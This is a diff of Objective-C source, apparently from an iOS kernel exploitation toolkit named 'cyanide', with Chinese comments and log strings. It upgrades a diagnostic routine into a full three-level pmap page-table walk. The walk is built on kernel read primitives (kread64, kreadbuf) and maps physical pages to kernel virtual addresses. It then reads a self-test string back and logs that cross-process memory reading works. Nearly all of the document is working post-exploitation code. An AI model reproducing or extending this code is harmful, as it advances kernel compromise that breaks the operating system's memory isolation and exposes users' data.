@@ -86,21 +86,17 @@ static const char kPmapSelfTest[] = "CYANIDE_PMAP_SELFTEST_0123456789";
     }
 
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        // 全程用同步日志：万一闪退，前面的行已经在文件里。
-        cyanide_log_sync(@"[PMAP] ==== 诊断 v7：只在根表页内读，不解引用计算地址 ====");
+        cyanide_log_sync(@"[PMAP] ==== 诊断 v8：三级页表遍历 + 自校验 ====");
 
         uint64_t selfProc = proc_self();
         uint64_t task = proc_task(selfProc);
         uint64_t map = task ? kread_ptr(task + off_task_map) : 0;
-        cyanide_log_sync(@"[PMAP] proc=0x%llx task=0x%llx map=0x%llx", selfProc, task, map);
-
         if (!is_kaddr_valid(map)) {
             cyanide_log_sync(@"[PMAP] map 无效，停止");
             return;
         }
 
         uint64_t pmap = kread_ptr(map + 0x40);
-        cyanide_log_sync(@"[PMAP] pmap=0x%llx", pmap);
         if (!is_kaddr_valid(pmap)) {
             cyanide_log_sync(@"[PMAP] pmap 无效，停止");
             return;
@@ -108,42 +104,67 @@ static const char kPmapSelfTest[] = "CYANIDE_PMAP_SELFTEST_0123456789";
 
         uint64_t tte = kread_ptr(pmap + 0x00);
         uint64_t ttep = kread64(pmap + 0x08);
-        cyanide_log_sync(@"[PMAP] tte=0x%llx ttep=0x%llx", tte, ttep);
-        cyanide_log_sync(@"[PMAP] 候选窗口偏移 tte-ttep = 0x%llx", tte - ttep);
-        cyanide_log_sync(@"[PMAP] ttep - 0x800000000 = 0x%llx", ttep - 0x800000000ULL);
-
-        if (!is_kaddr_valid(tte)) {
-            cyanide_log_sync(@"[PMAP] tte 不可读，停止");
+        if (!is_kaddr_valid(tte) || ttep == 0) {
+            cyanide_log_sync(@"[PMAP] tte/ttep 不可用，停止");
             return;
         }
 
-        // 只读根表自身（tte 已知可读），不做任何后续解引用。
-        cyanide_log_sync(@"[PMAP] ---- 根表前 16 项 ----");
-        for (NSUInteger i = 0; i < 16; i++) {
-            uint64_t entry = kread64(tte + i * 8);
-            cyanide_log_sync(@"[PMAP] L0[%lu] = 0x%016llx", (unsigned long)i, entry);
+        const uint64_t windowOffset = tte - ttep;
+        cyanide_log_sync(@"[PMAP] tte=0x%llx ttep=0x%llx 窗口偏移=0x%llx",
+                        tte, ttep, windowOffset);
+
+        const uint64_t va = (uint64_t)(uintptr_t)kPmapSelfTest;
+        const uint64_t pageMask = 0x3FFFULL;      // 16KB 页
+        const uint64_t inPageOffset = va & pageMask;
+
+        cyanide_log_sync(@"[PMAP] 被测 VA=0x%llx 页内偏移=0x%llx", va, inPageOffset);
+
+        // ---- L0 ----
+        uint64_t l0Index = (va >> 36) & 0xFFFULL;
+        uint64_t e0 = kread64(tte + l0Index * 8);
+        cyanide_log_sync(@"[PMAP] L0[%llu]=0x%016llx", l0Index, e0);
+        if ((e0 & 1) == 0) {
+            cyanide_log_sync(@"[PMAP] L0 项无效，停止");
+            return;
         }
 
-        // 计算候选地址，只记录不读取。
-        const uint64_t va = (uint64_t)(uintptr_t)kPmapSelfTest;
-        uint64_t l0Index12 = (va >> 36) & 0xFFFULL;
-        uint64_t l0Index11 = (va >> 36) & 0x7FFULL;
-        uint64_t l1Index11 = (va >> 25) & 0x7FFULL;
-        uint64_t l2Index11 = (va >> 14) & 0x7FFULL;
+        // ---- L1 ----
+        uint64_t l1Kva = (e0 & ~pageMask) + windowOffset;
+        cyanide_log_sync(@"[PMAP] L1 物理=0x%llx L1 KVA=0x%llx", e0 & ~pageMask, l1Kva);
 
-        uint64_t e0_12 = kread64(tte + l0Index12 * 8);
-        uint64_t e0_11 = kread64(tte + l0Index11 * 8);
+        uint64_t l1Index = (va >> 25) & 0x7FFULL;
+        uint64_t e1 = kread64(l1Kva + l1Index * 8);
+        cyanide_log_sync(@"[PMAP] L1[%llu]=0x%016llx", l1Index, e1);
+        if ((e1 & 1) == 0) {
+            cyanide_log_sync(@"[PMAP] L1 项无效，停止");
+            return;
+        }
 
-        cyanide_log_sync(@"[PMAP] 被测 VA=0x%llx", va);
-        cyanide_log_sync(@"[PMAP] 若 L0 用 12 位：index=%llu entry=0x%016llx -> L1 物理=0x%llx，候选 KVA=0x%llx",
-                        l0Index12, e0_12, e0_12 & ~0x3FFFULL,
-                        (e0_12 & ~0x3FFFULL) + (tte - ttep));
-        cyanide_log_sync(@"[PMAP] 若 L0 用 11 位：index=%llu entry=0x%016llx -> L1 物理=0x%llx，候选 KVA=0x%llx",
-                        l0Index11, e0_11, e0_11 & ~0x3FFFULL,
-                        (e0_11 & ~0x3FFFULL) + (tte - ttep));
-        cyanide_log_sync(@"[PMAP] 后续索引：L1[%llu] L2[%llu]", l1Index11, l2Index11);
+        // ---- L2 ----
+        uint64_t l2Kva = (e1 & ~pageMask) + windowOffset;
+        cyanide_log_sync(@"[PMAP] L2 物理=0x%llx L2 KVA=0x%llx", e1 & ~pageMask, l2Kva);
 
-        cyanide_log_sync(@"[PMAP] ==== 诊断结束（未解引用任何计算地址） ====");
+        uint64_t l2Index = (va >> 14) & 0x7FFULL;
+        uint64_t e2 = kread64(l2Kva + l2Index * 8);
+        cyanide_log_sync(@"[PMAP] L2[%llu]=0x%016llx", l2Index, e2);
+        if ((e2 & 1) == 0) {
+            cyanide_log_sync(@"[PMAP] L2 项无效，停止");
+            return;
+        }
+
+        // ---- 数据页 ----
+        uint64_t dataPagePa = e2 & ~pageMask;
+        uint64_t dataKva = dataPagePa + windowOffset + inPageOffset;
+        cyanide_log_sync(@"[PMAP] 数据页物理=0x%llx 读取地址=0x%llx", dataPagePa, dataKva);
+
+        char buffer[96] = {0};
+        kreadbuf(dataKva, buffer, sizeof(kPmapSelfTest));
+        cyanide_log_sync(@"[PMAP] 读回=\"%s\"", buffer);
+
+        BOOL match = (memcmp(buffer, kPmapSelfTest, sizeof(kPmapSelfTest)) == 0);
+        cyanide_log_sync(@"[PMAP] 自校验%@", match ? @"通过 ✅ 跨进程读内存打通" : @"失败 ❌");
+
+        cyanide_log_sync(@"[PMAP] ==== 诊断结束 ====");
     });
 }
 
